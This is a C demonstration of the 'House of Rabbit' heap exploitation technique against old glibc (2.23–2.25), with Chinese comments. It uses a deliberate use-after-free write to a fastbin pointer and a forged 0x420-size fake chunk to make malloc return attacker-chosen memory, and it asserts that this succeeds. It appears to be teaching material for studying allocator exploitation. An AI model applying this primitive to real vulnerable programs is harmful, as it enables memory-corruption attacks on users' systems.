/*
 * 手法：House of Rabbit，适用于 glibc 2.23～2.25，x86-64。
 *
 * 漏洞模型：free 后仍可写 victim->fd。我们把属于 0x20 fastbin 的 victim
 * 指向一个 size=0x420 的全局 fake chunk。老 malloc_consolidate 不检查链中
 * 每个节点是否仍属于原 fastbin，因此会把这个“大” fake chunk转入 largebin。
 * 成功判据：malloc(0x410) 返回 fake+0x10。
 */
#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

/* fake chunk 必须 0x10 对齐，并为 next/next-next header 留空间。 */
static uint64_t fake_area[0x90] __attribute__((aligned(16)));

int main(void) {
    setbuf(stdout, NULL);

    uint64_t *victim = malloc(0x18);       /* 本例的内部 chunk size 为 0x20。 */
    void *guard = malloc(0x18);            /* 防止 victim 与 top 合并 */
    (void)guard;

    /* fake 的 PREV_INUSE=1，真实大小 0x420；这与原 fastbin 的 0x20 不同。 */
    fake_area[1] = 0x421;

    /* malloc_consolidate 会查看 fake+0x420 处的下一块。 */
    fake_area[0x420 / 8 + 1] = 0x21;
    /* inuse_bit_at_offset(next, 0x20) 会读取这里的 PREV_INUSE。 */
    fake_area[0x440 / 8 + 1] = 0x1;

    free(victim);
    /* 漏洞触发点：老版本 fastbin fd 是明文指针。 */
    victim[0] = (uint64_t)fake_area;

    /* 大申请先触发 malloc_consolidate，再把 0x420 fake 排入 largebin。 */
    void *trigger = malloc(0x1000);
    assert(trigger != NULL);

    void *result = malloc(0x410);           /* request2size(0x410)=0x420 */

    assert(result == (void *)(fake_area + 2));
    puts("[+] Rabbit：跨尺寸伪块命中");
    return 0;
}
